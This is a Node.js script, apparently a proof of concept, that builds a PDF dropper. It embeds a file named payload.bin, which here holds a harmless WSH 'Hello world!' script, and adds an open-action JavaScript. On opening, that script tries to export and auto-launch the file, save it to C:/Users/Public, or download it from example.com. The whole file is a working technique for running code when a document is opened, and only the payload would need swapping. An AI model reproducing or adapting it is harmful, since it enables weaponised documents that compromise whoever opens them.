/**
 * x8.js
 * 1) Writes "payload.bin" containing WSH code to say "Hello world!"
 * 2) Creates x8.pdf embedding payload.bin
 * 3) On open, tries multiple export methods:
 *    - this.exportDataObject({ cName: "payload.bin", nLaunch: 2 })
 *    - this.saveAs("C:/Users/Public/payload.bin")
 *    - app.launchURL("https://example.com/payload.bin", true)
 *
 * After export, if Acrobat & OS allow, "payload.bin" runs via WSH, showing a dialog:
 *   WScript.Echo("Hello world!");
 */

const fs = require('fs').promises;
const { PDFDocument, PDFName, PDFString } = require('pdf-lib');

(async () => {
  try {
    //---------------------------------------------------------------
    // STEP 1: Generate the "payload.bin" file with WSH script
    //---------------------------------------------------------------
    // This minimal VBScript/JScript snippet shows "Hello world!" via WSH:
    const wshCode = 'WScript.Echo("Hello world!");';
    await fs.writeFile('payload.bin', wshCode, 'utf8');
    console.log('Created payload.bin with WSH code.');

    //---------------------------------------------------------------
    // STEP 2: Read payload.bin for embedding
    //---------------------------------------------------------------
    const fileBytes = await fs.readFile('./payload.bin');

    //---------------------------------------------------------------
    // STEP 3: Create a new PDF and embed the file
    //---------------------------------------------------------------
    const pdfDoc = await PDFDocument.create();
    pdfDoc.addPage([595.28, 841.89]); // A4, content unimportant

    // Build EmbeddedFile stream
    const embeddedFileStream = pdfDoc.context.flateStream(fileBytes, {
      Type: 'EmbeddedFile',
      Subtype: 'application/octet-stream',
    });
    const embeddedFileRef = pdfDoc.context.register(embeddedFileStream);

    // Create FileSpec referencing that stream
    const fileSpecDict = pdfDoc.context.obj({
      Type: 'Filespec',
      F: PDFString.of('payload.bin'),
      EF: pdfDoc.context.obj({ F: embeddedFileRef }),
    });
    const fileSpecRef = pdfDoc.context.register(fileSpecDict);

    // Add it to the PDF's EmbeddedFiles name tree
    const embeddedFilesNameTree = pdfDoc.context.obj({
      Names: [PDFString.of('payload.bin'), fileSpecRef],
    });
    const embeddedFilesNameTreeRef = pdfDoc.context.register(embeddedFilesNameTree);

    pdfDoc.catalog.set(
      PDFName.of('Names'),
      pdfDoc.context.obj({
        EmbeddedFiles: embeddedFilesNameTreeRef,
      })
    );

    //---------------------------------------------------------------
    // STEP 4: On PDF open, run doc-level JavaScript
    // Tries 3 methods to export+launch the file
    //---------------------------------------------------------------
    const openActionJS = `
(function() {
  // Method 1: exportDataObject + auto-launch
  try {
    this.exportDataObject({ cName: "payload.bin", nLaunch: 2 });
    return;
  } catch(e) {}

  // Method 2: saveAs to a known path (Windows example)
  try {
    this.saveAs("C:/Users/Public/payload.bin");
    return;
  } catch(e) {}

  // Method 3: Fallback to launching a URL (GET download)
  try {
    app.launchURL("https://example.com/payload.bin", true);
  } catch(e) {}
})();
`;

    const jsActionDict = pdfDoc.context.obj({
      Type: PDFName.of('Action'),
      S: PDFName.of('JavaScript'),
      JS: PDFString.of(openActionJS),
    });
    const jsActionRef = pdfDoc.context.register(jsActionDict);
    pdfDoc.catalog.set(PDFName.of('OpenAction'), jsActionRef);

    //---------------------------------------------------------------
    // STEP 5: Write the final PDF to disk
    //---------------------------------------------------------------
    const pdfBytes = await pdfDoc.save();
    await fs.writeFile('x8.pdf', pdfBytes);
    console.log('Created x8.pdf with embedded payload.bin.');

  } catch (error) {
    console.error('Error:', error);
  }
})();
